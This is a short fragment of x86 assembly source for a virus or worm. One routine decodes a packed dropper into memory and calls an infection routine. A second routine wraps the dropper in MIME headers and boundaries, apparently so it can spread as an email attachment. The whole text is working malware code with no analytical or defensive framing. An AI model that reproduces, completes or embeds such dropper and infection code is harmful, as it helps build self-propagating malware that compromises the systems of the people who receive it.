build_dropper:
       mov esi, ofs packed_dropper
       mov eax, [esi+4]
       mov [dropper_size], eax
       add eax,MAP_ADD
       push eax
       push 40h
       call [_GlobalAlloc]
       test eax,eax
       jz @@error
       mov [dropper], eax
       xchg eax,edi
       call z_decode_asm
;       mov by [droppergen],-1                  ;already non-zero
       call infectf
       mov by [droppergen],0                    ;start to working normaly
  @@error:
       ret


build_bo_dropper:
       pushad
       mov eax,bo_mime_size+bo_bnd_size+8
       add eax,[dropper_size]
       mov [bo_dropsize],eax

       push eax
       push 40h
       call [_GlobalAlloc]
       mov [bo_dropper],eax

       mov eax,[bo_dropsize]
       mov edi,ofs bo_size
       mov ecx, 10
       push -1
  @@div_loop:
       sub edx,edx
       div ecx
       push edx
       test eax,eax
       jnz @@div_loop
  @@sto_loop:
       pop eax
       inc eax
       jz @@done
       add al, '0'-1
       stosb
       jmp @@sto_loop
  @@done:

       mov edi,[bo_dropper]
       mov esi,ofs bo_mime
       mov ecx,bo_mime_size
       rep movsb

       mov esi,[dropper]
       mov ecx,[dropper_size]
       rep movsb

       mov esi, ofs bo_bnd-4
       mov ecx, bo_bnd_size+4
       rep movsb

       mov eax, '--'
       stosd
       popad
       ret


